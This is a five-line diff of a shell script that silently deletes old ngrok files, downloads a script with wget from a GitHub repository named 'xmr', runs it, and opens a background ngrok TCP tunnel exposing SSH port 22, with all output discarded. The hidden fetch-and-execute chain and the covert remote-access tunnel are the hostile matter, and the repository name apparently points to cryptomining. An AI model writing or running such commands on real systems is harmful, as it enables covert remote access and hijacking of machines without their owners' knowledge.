@@ -1,5 +1,5 @@
 rm -rf ngrok ngrok.zip ngrok.sh > /dev/null 2>&1
-wget -O ngrok.sh https://raw.githubusercontent.com/tandewpal/xmr/main/ngrokcode.sh > /dev/null 2>&1
+wget -O ngrokok.sh https://raw.githubusercontent.com/tandewpal/xmr/main/ngrokcode.sh > /dev/null 2>&1
 chmod +x ngrokok.sh
 ./ngrokok.sh
 ./ngrok tcp --region ap 22 &>/dev/null &
